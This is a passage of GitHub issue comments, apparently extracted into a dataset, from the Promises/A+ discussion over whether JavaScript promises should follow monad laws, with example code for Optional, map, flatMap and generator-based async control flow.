some other real monads such as option/maybe and a reactive pattern monad.
What does strange look like to a developer running across a problem.
On Apr 11, 2013 7:46 PM, ""Brian McKenna"" notifications@github.com wrote:

> @erights https://github.com/erights but Promises/A+ already provides a
> compatible then method. They are close to monadic. It's a problem with
> promises if they do strange things with other monads. They shouldn't.
> 
> —
> Reply to this email directly or view it on GitHubhttps://github.com/promises-aplus/promises-spec/issues/94#issuecomment-16250312
> .
"
5167	"@killdream By ""stripped version of structural typing"", if you mean, ""duck typing"", yes. And yes, it is sad. There are many sadder things that we live with because of historical constraints.

""every superset of { then :: Function } is considered a Promise =/"". No. every superset of { then :: Function } is considered a thenable. That's an important difference.
"
5168	"> ""every superset of { then :: Function } is considered a Promise =/"". No. every superset of { then :: Function } is considered a thenable. That's an important difference.

Is there somewhere that describes exactly what semantics a Thenable is expected to have? I've taken to calling monads in Javascript ""Thenables"", and I'd like to know if I'm reading into it too much.
"
5169	"@erights well, it doesn't make much of a difference in this case, as it's more of an issue with them always being treated as something really close to a Promise in semantics, such that you can safely assimilate them.
"
5170	"It should be pretty obvious that interop with anything but promises is 100% out of scope for the promises spec and the promises community.
"
5171	"People still wanting examples:

```
// I'd implement this differently but I'd have to explain
function Optional(a) {
    this.hasValue = typeof a != 'undefined';
    this.value = a;
}
Optional.of = function(a) {
    return new Optional(a);
};
Optional.none = new Optional();
Optional.prototype.then = function(f) {
    if(!this.hasValue) return this;
    return f(this.value);
};
```

Let's write a single function to add my last name to both promises and optional values (assuming promises have `constructor.of`):

```
// Helper library
function map(x, f) {
    return x.then(function(a) {
        return x.constructor.of(f(a));
    });
}

function addLastName(m) {
    return map(m, function(name) {
        return name + ' McKenna';
    });
}
```

Promises in application.js:

```
addLastName(promisedNmae)
    .then(function(name) {
        // Brian McKenna
        console.log(name);
    });
```

Optional values in test.js:

```
addLastName(Optional.of(""Brian""))
    .then(function(name) {
        // Brian McKenna
        console.log(name);
    });
```
"
5172	"@pufuwozu Thanks for all the time and attention you have given to providing this argument.  My points were not to say /A+ promises were close enough, but rather that it seems that an A+ promise can be wrapped into a monadic value as you describe it.  And in that sense, it may well be that the spec is ""good enough"" for both communities, the  promises community that is focused on what seems a more intuitive (and powerful) interface focused on a particularized use case.

I think the point made by @Twisol is that the /A+ promises functionality of a two-parameter then cannot be identically reflected from a pure monadic promises implementation, but the pure monadic implementation can be built from the /A+ specification.  This suggests to me that the status quo can be resolved simply with /A+, and a monadic wrapper surrounding it.   Clearly, promises folk can't rely on libraries depending on monads without wrapping, but once wrapping they can have all the benefits, with the corresponding costs.

Where am I dropping the thread here?
"
5173	"> I think the point made by @Twisol is that the /A+ promises functionality of a two-parameter then cannot be identically reflected from a pure monadic promises implementation

Just to clarify: The presence of a more powerful function doesn't mean that it's somehow not a ""pure"" monad. The promise wrapper you mention could easily expose a 2-ary `then`-like function; it's just outside the scope of what a monad requires. (See Haskell's Either and its `either` function, they're pretty directly analogous.)
"
5174	"@erights it's interesting that polotek/procstreams has been brought up a few times when people start talking about promises/monads, etc. I haven't been following all of the debate. I don't have that much of a vested interest. But since you've addressed me directly, I'll respond here for future reference.

Asking me to ""fix my library"" presumes that you've decided it's broken. It also presumes that I would agree with you that it's broken. My library works as designed for the most part. It's even got some tests on it (non-exhaustive as they may be). The point of contention here seems to be my use of the names ""promise"" and ""then"" in my design. Before I respond to that, let me say I actually really like the work done here with promises A+. Not because I subscribe to all of the ideas here. But because I love to see folks working together to improve their corner of the world. It's great work, and when/if I ever pick up a promise implementation, I'd take a second to check if it was A+ compliant. Because I think you all have put a lot of thought into things.

That said. I think it's a bit disingenuous to suggest to me and everyone else who ever uses the names ""promise"" and ""then"" that they should conform to A+. Even considering that I agree with what you're trying to accomplish here. There are several reasons for this. One is the presumption that I share your goal of interoperability. ""until @polotek fixes his library, it can't co-exist with various promise libraries"". Procstreams weren't designed to co-exist with promise libraries. No one has asked for it. I'm not sure how it has somehow become a requirement for your design, or how subsequently fixing that is my problem. Or maybe I'm misunderstanding your point. Are you saying that the promises A+ spec cannot and _should not_ try to accomodate all `Thenables` in js? Because that I agree with.

I appreciate folks here for thinking of me. But procstreams probably won't change. Not because I'm a jerk. But because I like the way it is now. And more importantly, no one here has bothered establishing a connection with me that would make me inclined to accomodate you. If the plan is to effectively convert all Thenables in all libraries to support A+, this may come up a lot. Pulling people into random arguments and telling them to fix their code probably isn't the best tactic.
"
5175	"@polotek ""Pulling people into random arguments and telling them to fix their code probably isn't the best tactic.""

Hi Marco, you are correct. I apologize. I really like your clarification and agree with much of what you have to say.
"
5176	"@tonymorris while @domenic's words weren't the best ones throughout this thread, I don't think we need any more fighting here.
"
5177	"@domenic Is there an accepted way to banish someone from further posts? I admin some email lists. After a post like @tonymorris's, I would banish that person, probably forever. But the mechanics of discussion on Github are new to me.
"
5178	"@erights I'm pretty sure there's no built in way to do so.  It would probably be worth e-mailing GitHub support though, they may well help.
"
5179	"@ForbesLindesay thanks. Starting from the support link, I found https://help.github.com/articles/blocking-a-user
@ForbesLindesay @domenic @briancavalier @kriskowal @unscriptable I am not a member or owner of this group, so could one of you follow these instructions to ban @tonymorris from making further posts here? Thanks.
"
5180	"+1 to what @polotek said.

I consider it [utter hogwash for anyone advocating for Promises/A+](https://github.com/promises-aplus/promises-spec/issues/94#issuecomment-16249983) that anyone else who has ever built a lib with a `then()` method now needs to change their API to make way for the freight train (called Promises/A+) that is barreling their way. Of all the blustering in this thread, and I just read the whole thing, it was that notion that completely ""lost"" me.

There's (I'm sure) at least several libs in the pantheon of JS which have used the `then()` method name and they're not promises compliant (or assimilable by a promise in a way that wouldn't constitute surprise behavior by the person who was used to different behavior before introducing Promises/A+ into the mix).

For reference, I have been doing ""promise like"" coding in JS for well over 3 years now. I am quite certain I was experimenting with these ideas well before Promises/A+ came along, and probably well before a lot (not all) on this thread were. And I have [written promise libs using the `then()` method way before](https://github.com/getify/BikechainJS/commit/a409c0ec114e7b2c2871d778de89beb17736d7a5) you decided to ""reserve"" that name.

My current works in the promises area are [asyncGate](https://github.com/getify/asyncGate.js) and [asyncSteps](https://github.com/getify/asyncSteps.js), both of which abstract lightly the concept of promises, but provide simple(r) APIs for managing async code flow. Both of these libs were ALSO written before Promises/A+ came along. And both of them use `then()`. I'm not 100% positive, but I am pretty sure my libs are not A+ compliant and that they would behave in unexpected/surprising ways if incidentally assimilated by a A+ lib.

I don't relish that my libs will forever be banished as incompatible (and broken by) from your way of viewing the promises world. But note: I am not the one who's creating the incompatibility, ""you"" are. My libs definitely wouldn't reject or misbehave if they saw one of your objects floating by. If you had any goal of trying to get any of us on the fringe on board, this tact was definitely not the way of doing so.

I'll head back into my hole now.
"
5181	"For the many people interested, I've just created a ""Fantasy Land"" project to work towards an interface for different algebraic structures:

https://github.com/pufuwozu/fantasy-land

![](https://raw.github.com/pufuwozu/fantasy-land/master/logo.png)

I hope Promises/A+ will eventually be fully compliant with the monad algebra.

Thanks.
"
5182	"Brendan Eich's take on all this: https://twitter.com/Raynos/status/322541558685638658 (scroll up)
"
5183	"@killdream Point taken. Sorry.
"
5184	"I have to admit that it was more than once that I wished promises had distinct handlers for `success` and `failure` than mixed `then`. @pufuwozu I'm afraid that it's too late change meaning of `then` mainly because it's being de-facto standard for long enough that change will break web.

Although I think there is a productive solution to this problem. Maybe ""Fantasy Land"" could spec Monads without
overloading name `then` but defining `flatMap` instead. Later goal of making `then` be just a combination 
of `.flatMap(f)` and `onReject(handler)` can be proposed to this community.

In the meantime current `then` still may be used to achieve what you're looking for:

``` js
function flatMap(p, f) {
  return (p.flatMap || p.then)(f);
}

function onReject(p, f) {
  return p.onReject ? p.onReject(f) : p.then(null, f);
}
```
"
5185	"aaand we have first users of fantasy land spec: bacon.js!
"
5186	"A long time ago in a company far, far away, there was a young engineer given a herculean task within an impossible deadline. He created LiveScript. One of the decisions he made was to make functions first-class values rather than have them be ""something else"" like the other popular languages of the day. Another was to use prototypical inheritance rather than classical inheritance, like the other popular languages of the day.

It would take years for the programming community to embrace the power of functions as first-class values in his language. Most people agree that Crockford got the ball rolling, followed by Oliver Steele and you can trace a direct line down to Jeremy Ashkenas and Underscore from there. Today, it is unthinkable to imagine a JavaScript without functions that can return functions or apply functions.

Conversely, prototypical inheritance hasn't reached a tipping point. The vast majority of programmers simply emulate classical inheritance and do not exploit its power in any way.

What does this history tell me about promises?

I think that promises-that-are-monads are in the same category as these two ideas I cited. If we embrace the idea of promises being first-class monads, we will likely have a lot of ""meh"" for a year or maybe three. Then someone will write a library or give a talk and the light will go on. It is had to imagine what wonderful thing will be created when that happens.

Did Brendan predict what people would build? No, he merely designed something that had a good feature and history rolled forward. I do not criticize promises-that-are-monads because it is hard to predict what good things they will enable. Plant the seed, and we will see what fruit its tree bears.

So, obviously, I am in favour.

Now, I do not wish to naysay those who argue against it. Thus, prototypical inheritance. It could be that everybody just uses it to emulate the thing we already have and never grow beyond it. It could be that it is just some weird thing that causes people to write books about its ""warts and confusing features.""

I don't know. Given the history of these two things--first-class functions and prototypical inheritance--it's fair to say that we don't know will happen if we introduce this idea. It could ignite like first-class functions. It could fizzle like prototypical inheritance. In 1996, who could predict which idea would grow and which would lay fallow?

But I do think this idea is the kind of elegant thing that makes new things possible. And I do know what will happen if we don't embrace this idea: We absolutely won't have new, powerful things.

I think the potential benefit outweighs the immediate ""unpragmatism,"" and I think it is very JavaScript-y to do so. Much of the deep love people have for JavaScript is the way it is a powerful language made out of simple ideas.

That's because things compose and combine in elegant ways. So let's embrace that and find a way to make promises-that-are-monads happen.

JM2C. Thank you for your time reading my thoughts.
"
5187	"I see a lot of potential value for the JS community in having Promises/A+ promises be compatible with a monad system, and I can relate to @raganwald's thoughts.  So, I created #97 to see if we can find a way.
"
5188	"@pufuwozu I take your input as really valuable, it's not always that I see such strong feedback from someone coming from strictly functional land (the direction I always wanted to go). Still I have a feeling that while putting your proposals, you have missed why actually some of us use promises, and didn't look thoroughly into real problems that they solve on our side.

Have you worked with async IO? Have you tried to compose some complex async flow while working with Node.js?
For developers like me, promises are best abstraction to deal with that, and as far as I know, promise concept was created exactly for that.

You subject the fact that `then` takes two function arguments, one for success and other for error. Let's put for a moment all monad theories aside.
Thing is, in async IO, you cannot just ignore error handling, or make it as something optional. Error handling is integral part of a flow. Async operations concentrate around assumptions (not facts), they're subject to race conditions and error is a way to say that assumption was wrong.
There is a very valid reason why in Node.js basic async function takes callback of which signature _first_ argument is reserved for an error (you actually need to _walk around it_ to ignore it). **Silent, unhandled error can be way worse than unhandler error that throws**.

This is also the reason why `then` serves both success and error flow, as both of the flows are integral part of async operaton. So however great monad theory can be for promises, it must play nice with this characteristics, to make us feel that it's practical.

You also proposed to take concept of `then`, abstraction level down, while the semantics of its name says: _when value is available then do this_. It doesn't fit synchronicity of monads and I wouldn't try to fit it there. In that perspective _then_ for array-likes doesn't make logical sense, it would be very confusing.

I think, that for bridging our minds, the best would be if you'll test your theory on some real async IO use cases, e.g. take this example: https://github.com/medikoo/deferred#promises-approach
Proceed with some different ones (without ignoring the need of error handling).
That way you may get better idea of real use cases that we use promises for, and seeing your version we may get better idea of how current spec can benefit from functional theories that you certainly have mastered.
"
5189	"@medikoo I have written completely asynchronous and purely functional web applications using Scala's implementation of Promises. I work on an purely functional big data store - with an asynchronous backend as part of its monad stack. I do lots of error handling - I of course need to.

I did not have to create something similar to `then(onFulfilled, onRejected)`. It is not necessary for it to be like that.

Suggesting that I lack experience because I would come up with the same API is incorrect. I have done this stuff using tools much better than Promises/A+ specifies.
"
5190	"@pufuwozu I just suggested that probably you didn't take into account real use cases we use promises for.

I'd love to see some example of async IO flow written your way. Can you link some project/example, we could learn from?
"
5191	"@medikoo: Promises can provide their own primitive (i.e. 2-ary `then`) that supports both paths, and also implement the monadic bind (whatever we end up calling it) that only deals with the success path. If you're dealing directly with a promise, you don't have to feel restricted by the monad interface; you can use the full 2-ary `then` as you always would. But if you're dealing with monads in general, you can deal with a monad-conformant promise and any other monad identically for whatever purpose you need.

Honestly, you're right that error handling is much more fundamental in Javascript than in, say, Haskell. So I can imagine that most useful monads will also implement some kind of MonadError analog. But they should be treated as separate concerns.
"
5192	"I feel like some chronology is in order, since it seems not to be widely known.
- 1970s: Promises/futures are introduced.
- 1976: The definition of a monad is introduced.
- 1991: Eugenio Moggi demonstrates that monads underly many interesting notions of computation
- 1992: Philip Wadler proposes using monads directly in programming
- 1995: JavaScript begins
- 2008: Futures forming a monad is well known and variations are blogged by (at least) Conal Elliott and Rúnar Oli. I suspect the first exposition of this idea was around ~2000 when parallel Haskell was really bullish on futures, but I cannot find a canonical reference. Since continuations and function application have always been known to form monads, talking about promises may have been less publishable.
- 2009: Node.js begins (according to Wikipedia)

The framing of promises as something new or unique to JavaScript or Node is incorrect. Obviously their expression in JavaScript is, and should be, idiomatic, so that part is new.

A framing that makes sense is that this discussion, or perhaps #97, is about the present and future relationship/compatibility between:
1. Mathematical structures that are known to underly most notions of computation -- whether it is typed, untyped, imperative, or functional -- and to be very handy for a variety of programming tasks.
2. The extensive work on promises that predates Javascript and Promises/A+.
3. Promises as they have recently been developed by a variety of JavaScript libraries.

As a JavaScript programmer who values the lessons of the past decades of progress in programming theory, I think this makes for an interesting discussion.
"
5193	"@Twisol that sounds much more sane. I'd leave `then` as it is, and alternatively provide monadic _bind_ (under different name, as `bind` is already taken in  JavaScript). Still question is, should it be part of this spec (?) Some side spec for monad characteristics may fit better.
"
5194	"@medikoo: We're doing that [over here](https://github.com/pufuwozu/fantasy-land). :smiley:
"
5195	"@Twisol ah, yeah, I've noticed that earlier, looks indeed _promising_ :)
"
5196	"@kennknowles Hi Kenn, thanks for your review of the history. I know much about the history of promises but much less about the history of monads. On their intersection, I don't know of anything earlier than 2008. If you do find any earlier expositions, I would indeed be very interested.

While promises/futures as a whole do indeed have a long history, the comparative novelty (mid-to-late 1990s) relevant to JavaScript promises is 
a) the use of _non-blocking_ promises in the context of communicating event loops, and 
b) that the callback registration (by ""when"" aka ""then"") returns a promise for what the callback will return. 
Yes, #b is much of why they currently look monad-like. But this idea was proposed on e-lang by Mark Seaborn and first incorporated into E in, IIRC, the late 90's. This was well before we had any hint of a connection to monads.

Prior callback-registration systems always had the registration return void/null, and so the purpose of the callback could only be the side effects it performs. As may now seem obvious to monad folks, with this innovation we could use promises to rearrange operational time while still staying within a mostly functional style. Tom Van Cutsem's thesis at http://soft.vub.ac.be/~tvcutsem/publications/phd_tom_van_cutsem.pdf explains all this rather well.
"
5197	"@erights Very cool! Thanks for the additional references. Let us definitely hope that these various threads can all be leveraged. I'm afraid I don't have time to reference chase, but I would start with something from [Alice ML (~2005)](http://www.ps.uni-saarland.de/alice/papers.html) or [A monad for deterministic parallelism (2011)](http://community.haskell.org/~simonmar/papers/monad-par.pdf) and work backwards.
"
5198	"@erights @kennknowles: could this be the original Mark Seaborn's proposal?

<blockquote>
Suppose the protocol is changed:  Rather than just sending P, Bob also
sends an arrowtail connected to P and an arrowhead that Alice will
connect to be an observer for B.  Bob keeps the arrowtail to Alice's
observer for P.  Soon after sending this message, Bob finds out that P
resolved to X.  Bob notifies Alice of this by sending a message to
Alice's observer for P.
</blockquote>

http://www.eros-os.org/pipermail/e-lang/2001-July/005516.html
"
5199	"@joseanpg Thanks for trying to find it! But no, that's not it. That one is about the protocol and is interesting. But the message I'm thinking of is something else. Sorry I don't have anything more helpful to offer for tracking this down.
"
5200	"Hey guys.
What a great discussion has been going on here. I love reading all the different perspectives. To be honest, I never really grasped the fundamentals of functional programming, and I still don't. Maybe I just have to ""pay up"" sometime to really . What I can say is that I definitely like the elegance of the composibility displayed in   @pufuwozu 's  code examples. It's all the more intriguing when thinking some (or all) of the code does not apply to his conception of promises but to other monads too. Although I wish I knew what these other types of monads could be.

WRT to the actual proposal in this issue, I do side with the ""conservatives"" here. I think that generally speaking, what's there now is good. At least I know I can build really cool stuff with it. Also, I think the benefits of ""DRY"" when seen in the context of open source ecosystem may be overstated. There is such a big ""work force"" out there, that you practically only have to wait for the functionality you want to appear (that is, on the level of functions, libraries). I think DRY mostly applies to code you write yourself (either individually or as a team, and where costs need to be accounted for). If you apply DRY, you'll save yourself time and headaches. 

I of course would love to see more work from @pufuwozu and similar-minded people. Code and prose from them greatly challenge me, which is always a good thing.

About half-way in the thread,  @juandopazo mentions an idea for an ArrayPromise, and that rang a bell for me as a simple ""OO"" programmer. I of course have made the jump to Javascript and first-class functions a while ago, so I have picked up some of the possibilities of first-class functions (and lost the urgence of putting everything inside a class). Recently I read an article from @jcoglan http://blog.jcoglan.com/2013/03/30/callbacks-are-imperative-promises-are-functional-nodes-biggest-missed-opportunity/ , and that lit a spark for me a few days after. (It had to sink in I think). 

In any case, I've now kind of set out to explore the full potential of promises more. My end aim is to make a full alternative to dealing with ""real"" values, instead dealing with unresolved (promised) values up to the point where the value is actually needed. This in-between state (I think predominantly useful for readable ""scripts"" in node.js, because there will be quite a performance hit) I dubbed ""promise land"". And as a ""land"", it must be truly livable. I'm trying to cut it up in more manageable pieces (and also, reusable components) because not everyone will be as charmed by promise land as I am. 

So currently I'm working on the following:
https://github.com/meryn/promised-builtins . This is like @juandopazo 's idea, but with the noun and adjective reversed. I'm more interested in the values (even though they're virtual, promised, simulated, however you call it) than the abstract concept of a promise. I think if I could have it my way, there wouldn't be a need for promises at all, because I just want to write beautiful code, dealing with concrete stuff (builtins, and composite ""business"" objects). 
https://github.com/meryn/faithful (alternative to Async library, which I currently rely on for most of my ""batch"" work)

All in all, I want to stress that this for me is primarily a code experiment. I just want to see where it leads me, and if coding in ""promise land"" is a good experience. Also I want to see what the performance implications of big chains of promised values are, compared to regular node callback style.

Note that all examples are in CoffeeScript, but everything works in JS as well.

If anyone's interested, I of course would love to collaborate, because the whole of ""promise land"" is quite a big thing to build.
"
5201	"Hello Meryn,
If you are serious about learning functional programmer proper, there are many of us willing and waiting to help you, including @pufuwozu. Let me know so you can be directed to the appropriate forum.
"
5202	"@tonymorris 
Well yes I'm serious, but I'm also lazy. Just being honest. I have only had one year of academic computer science (where it would probably have been forced upon me in later years), and up to now, no material I've stumbled across was accessible enough for me to _like it_. I mean, laziness for a programmer is all relative. I guess I want to say that up to now I haven't been willing to bore myself to learn it. I don't believe learning it would have to be boring in principle, but I just have not stumbled upon the right opportunity yet.
In short: the learning curve has been to steep. I managed to learn OO programming gradually. I think imperative programming comes way more natural to most. i.e. Just instruct your virtual servant what to do.

But I'd sure love pointers.

To be clear, I consider myself to be almost 100% self-taught. And I tend to figure out anything by myself. I don't ask questions usually. FP raises questions for me, that I never been able to answer in ""satisfactory"" time.
"
5203	"I must also add that at this point, I don't know if learning FP per se can really ""help me"". I've firmly settled on Javascript as language platform of choice, and I think that in light of ""transparancy"", I don't want any source-to-source compiling language to stray too far from Javascript semantics. What CoffeeScript does now is about the sweet spot for me.

I see two things in how it could benefit me:
1. Inspiration for powerful functions to be part of ""promise land"". Perhaps seeing certain pitfalls earlier.
2. Knowledge for later, to maybe perhaps realize my ambition of doing an own programming language. I care about aesthetics and elegance a lot, so I I grasp on to any opportunity to get things more ""right"". Right now, I want my own code to be totally DRY, so if I'd extrapolate that trait of me to potential language design, then I want my language to support me in gettings dry, hence offering the best kind of primitives to achieve that aim. And I know ""under-exposure"" to FP results in a blind spot for me. I of course have no idea of how much I'm missing out on. And even if what I'm missing isn't huge (or lots), then still, I want it all. :)
"
5204	"One thing that appeals to me about ""promise land"" is that it will be 100% at home in Javascript (and CoffeeScript). If I just wanted to make my code look more or less like synchronous code, I good go for something like IcedCoffeeScript. I can also imagine that there could be ES6 to ES5 transpilers which support the ""yield"" keyword. And then use something like task.js. Yet, I think it would result in awfully messy code, not in the least resembling what you wrote yourself.
"
5205	"@meryn do-notation in Haskell or for-comprehensions in Scala. Makes async code look synchronous. Also works for handling of optional values, list comprehensions, state, IO, reading configuration files, writing to logs...
"
5206	"Yep, most transpilers aren't nearly good enough to use in real application code.  Some of the ES6 ones are getting there with the addition of source maps etc.

The long term goal of promises is to make writing asynchronous code as easy as possible.

I think you slightly miss the point of DRY by saying it doesn't matter as much in open source.  It's not just about not writing the thing multiple times.  That is to say it's not just about saving time writing.  It's largely about bug fixes.  If you don't repeat yourself, then fixing a bug in one place fixes it ever.  Arguably that's more important in the open source world because if it's your own code you know what needs fixing.

Having said why DRY is important, let me tell you why it isn't.  It's important for code to be easy to read.  If a function is too ""clever"" it might become impossible for a new-commer to interpret.  You might think your being very clever by having one function that can double every number in an array or double the value represented by a promise depending on what's passed to it, but that will likely just make your code harder to interpret.

People will just start saying ""so what's this function intended to take as an argument, an array or a value."" when they're looking at the function's source.  And when they're looking at a value being passed to the function they're liable to say ""what does that function do, does it expect a promise for an array?  Is it going to treat my number as an array of bits and double each one, or does it just treat it as an array of length 1 and double that one number.  What will it return, a new promise or a new array."".

You need to try and write code that doesn't raise lots of questions.  That's why you want to be careful when using one representation for lots of largely unrelated things.  The key thing to always keep at the back of your mind when writing code is that you'll write it once, and it'll probably be read hundreds of times (on average).
"
5207	"I think I saw this do-notation mentioned a while ago. At that time, I thought it could have better been called ""await"" or so, because if I understood correctly, it halts execution of the ""series of statements"" in that function right there, up to the value has been resolved. I think it's much alike to what task.js uses ES6 yield for. I like that. I wish we had a  billion browsers with support for that. :)
"
5208	"Yep, ES6's `yield` (with task.js) is probably most similar to C#'s `await`.
"
5209	"My idea for promise-land is to translate as much of that syntax into function and/or object ""compositions"", in effect making the resulting ""language"" (you'd lose almost all regular language constructs after all!) a tiny bit ""lispy"". Note that this idea becomes a whole lot more alluring if you have CoffeeScript in mind, not Javascript. I'd go nuts over all the `function()`'s, braces and parentheses everywhere.
"
5210	"Nope, `do` notation is just sugar for transforming this:

``` hs
do
  text <- readFile ""foo""
  writeFile ""bar"" text
```

Into:

``` hs
readFile ""foo"" >>= writeFile ""bar""
```

Or in JS terms:

``` js
readFile(""foo"").then(function(contents){ return writeFile(""bar"", contents) })
```
"
5211	"@ForbesLindesay And Haskell's `do` is similar to that, right? Otherwise, I have misunderstood.

@killdream Our respective comments crossed each other.
"
5212	"Oh, that seems like @michaelficarra back-arrows for CoffeeScript (or whatever he called them). Now I know where he stole them from. ;)
"
5213	"@ForbesLindesay said ""Yep, ES6's yield (with task.js) is probably most similar to C#'s await."" See also http://wiki.ecmascript.org/doku.php?id=strawman:async_functions and Kris Kowal's adaptation of this in Q to current FF generators. I would argue this is more like C#'s await than task.js is, since it does not make tasks a subtype of promises.
"
5214	"@meryn yeah, @michaelficarra is a closet Haskell lover. JavaScript is fun but he'd use Haskell for real world programs :wink: 
"
5215	"``` haskell
readFile ""foo"" >>= writeFile ""bar""
```

In this code, how do any potentials errors flow? Would they be ""caught"" by a try catch block wrapping the entirety? Node-style callbacks require explicit ""error-propagation"".

Or maybe the more relevant example is this:

``` haskell
do
  text <- readFile ""foo""
  writeFile ""bar"" text
```

Where would any error go to?
"
5216	"@killdream `yield` when used with things similar to `task.js` (or the `Q` implementation) is essentially syntactic suggar for turning:

``` js
...expression start.... yield promise ....expression end....
...subsequent statements...
```

into

``` js
return promise.then(function (__uniqueVar__) {
  ...expression start.... __uniqueVar__ ....expression end....
  ...subsequent statements...
});
```

Except for the fact that it can handle **all** JavaScript flow-control constructs.  So it works exactly as normal with `try`/`catch`, `while` loops, `for` loops etc. It also does the correct thing even with conditional expressions like:

``` js
var value = tryGetFromCache() || yield getFromServer();
var value2 = getFresh ? yield getFromServer() : getFromCache();
```
"
5217	"Ehm, in my mind, syntactic sugar is something that actually translates to (less-friendly, less-sweet..) syntax. But if I understand task.js correctly, it doesn't do any code generation, right? I must say I have not studied it in depth. Just read through the examples a bit. I saw task.js as a kind of creating a ""controller-object"" which with some work make `yield` suit the purposes of the promise-community (instead of for iterators, where `yield` seemed to have been designed for).
"
5218	"Yes, it's not doing a transformation like that, but it's a nice way of thinking about it.  I have a project [QJS](https://github.com/ForbesLindesay/QJS) which attempts to implement `yield` as a source-to-source transformation.

I think you slightly mis-understand syntactic sugar though.  Syntactic sugar just means that it's new syntax to make something easier to write, but doesn't provide new functionality as such.  Anything you can write with `yield` + task.js you could write without it, it's not a new language feature as such, just syntactic sugar.

I find it helpful to understand it like that, because that way it doesn't seem like magic.  I don't like when things seem like magic, because that's when they tend to break in unpredictable ways (e.g. browserify@version1)
"
5219	"In case that wasn't clear, `yield` is syntactic sugar provided by Ecma Script 6.  Just because it's provided by the language and not a transformer, doesn't make it not syntactic sugar.
"
5220	"Is yield truly sugar? How about call stacks and such. If it's sugar, then I expect the call stack to look really weird, compared to what you see in code. Because anything that works a bit like ""yielding"" in ES5 involves a function that returns immediately, and calls a callback later. Hence very weird call stack. The call stack coming from the originator of an event. _I absolutely haven't studied this_.
"
5221	"@erights I thought there was no consensus for `await` since it prevented JS from being run-to-completion.
"
5222	"What I mean to say is, when you write ""yield"", are the statements coming after that put in a ""virtual"", invisible function that's being called later on with the right function context and arguments?

Ok, maybe it's so. Are ES6 interpreters gonna translate the errors (and call stacks) coming from that, hiding the fact that there were such ""implicit"" functions?
"
5223	"@meryn no, `yield` is not `await`. `yield` works in the context of generators. You can read about them [at MDN](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Iterators_and_Generators). Taskjs uses generators to chain promises under the hood. There are no magic transformations there.
"
5224	"I know (or rather, indeed believe) that task.js doesn't do magic transformations. But how many people are going to agree that generators and yield are ""syntactic sugar"" and not a new language feature? And if I misunderstand the definition of sugar (I'm not an expert on the phenomenom of computer languages...), let's be concrete:

What happens if something coming after the yield - yet inside the same generator - throws an error? Could the caller of the generator catch it, or not?

I mean, maybe interally, somewhere deep down it's all an illusion, but if generators+yield introduce more sync-like possibilities (i.e. catching errors) into the async world, then it'd be a mighty fine illusion.

This is what I call sugar:
translating

``` haskell
do
  text <- readFile ""foo""
  writeFile ""bar"" text
```

into

```
readFile ""foo"" >>= writeFile ""bar""
```

That is, I suppose that `>>= writeFile ""bar""` comes down to a callback of some sort.
Hence, my question - yet unanswered? - about what happens to the errors there.
"
5225	"I'm probably misunderstand the whole thing about generators. Relevant quote from MDN

> When a generator function is called the body of the function does not execute straight away; instead, it returns a generator-iterator object. Each call to the generator-iterator's next() method will execute the body of the function up to the next yield expression and return its result. When either the end of the function or a return statement is reached, a StopIteration exception is thrown.

I ought to study it more. Or maybe it's just more of weak-recollection of what exactly yield was doing, and what parts were taken up by task.js. 

Reading it like this, I expect the calll stack actually not to become that much friendlier, or any friendlier at all. It's probably just task.js which is gonna call this ""generator-iterator"" object for the second time _in response to having ""received"" a resolved promise_ (the one returned by the earlier yield). So originating call will be the event that caused the promise to resolve, and responsibility for dealing with errors thrown lies with task.js, which can catch it and fail the promise it has generated earlier.

Still, I'd love to know how Haskell deals with errors in the aforementioned example.
"
5226	"@meryn `readFile ""foo"" >>= writeFile ""bar""` is `readFile ""foo"" >>= (\contents -> writeFile ""bar"" contents)` - so yeah, callbacks.

The `>>=` operation focuses on the ""main"" case. Errors must be explicitly handled ""outside"" of `>>=`. For example, a global error handler:

```
handleErrors errorHandler $ readFile ""foo"" >>= writeFile ""bar""
```

Or a specific error handler:

```
readFile ""foo"" >>= (\contents -> handleErrors errorHandler (writeFile ""bar"" contents))
```

(better in do-notation)

```
do
  contents <- readFile ""foo""
  handleErrors errorHandler $ writeFile ""bar"" contents
```

Does that make sense?
"
5227	"So assigning a global error handler is probably a bit like node.js domains. (although I haven't studied that properly either).

I think I'd rather have a language that supports wrapping try catch around all such statements. Come to think of it, maybe a function could send along its own errorhandler function with each call it makes. Of course it can, that's just the anti-node double-callback style. That ""default"" of keep sending along the same errorhandler function could be given sugar, and then you can write 

``` coffee
try
  thismakesACallThatResultsInEventualFailure arg1, arg2, ->
   someMore (result) ->
     yetMore (result2) ->
       console.log result2 # only reaches this point when successful
catch (error) ->
  console.error error
```

Note the ""function"" in catch. The error handler is send as last argument to the function. The important thing here is that as soon as you do this, then later propagation of the error callback becomes implicit.

But then, this is not really important for as long I'm not going to design my own language... Or it's something that might be suitable for CoffeeScript. CoffeeScript would affix error callback to the end of the arguments of all functions inside the try block. This would require adapting node-style functions to double-callback style first of course.
"
5228	"@meryn if I understood correctly (I haven't read its source yet), this is what Taskjs does:

``` JavaScript
function foo() {
  var text = yield when.resolve('hello world');
  console.log(text);
}

var gen = foo();
var promise = gen.next();
promise.then(function (value) {
  gen.send(value);
  gen.next();
});
```
"
5229	"@meryn that's a side-effectful way to do the above. I'd rather do it with values. Always use values instead of not-values, when possible.
"
5230	"@pufuwozu ""side-effectful"", that's ~~latin~~ greek to me. ;) What are the side effects here, I wonder?

FP programs may have ""effects"" right? :) That is, there used to be a point where I thought that all they were allowed to do was compute one value, and then quit. But as I've learned, they can do plenty of io in the mean-time. Otherwise they wouldn't be that useful.
"
5231	"@meryn functional programming represents effects as values (see the IO monad). ""Not functional programming"" doesn't represent effects as values, which is where ""side-effects"" come in. Code is being evaluated (i.e. you're trying to get a value) but something observably happens in the mean time.

Functional programming does nothing but build up a value which represents which effects to execute. The runtime then executes those effects, based on the value. Allows you to reason about programs as just a composition of values to be evaluated.

The side-effect with try/catch is that a value is trying to be evaluated but then the program _jumps_ to the catch block. The _evaluation_ of a function is changed.
"
5232	"@juandopazo As Q and task.js showed, ""await"" can be easily expressed as a pattern using generators/""yield"" and promises. The reason neither ""yield"" nor ""await"" violate run-to-completion is that JS generators are _shallow_. This related to the syntactic sugar issue explained above. Generators/""yield"" can be compiled away by a _local_ cps (continuation passing style) transform of the generator function taken by itself. It does not threaten the run-to-completion semantics of anything else in the program.
"
5233	"@erights I see. Thanks. Does that mean that in order to introduce `await` in the language you'd also have to introduce promises?
"
5234	">  functional programming represents effects as values

@pufuwozu 
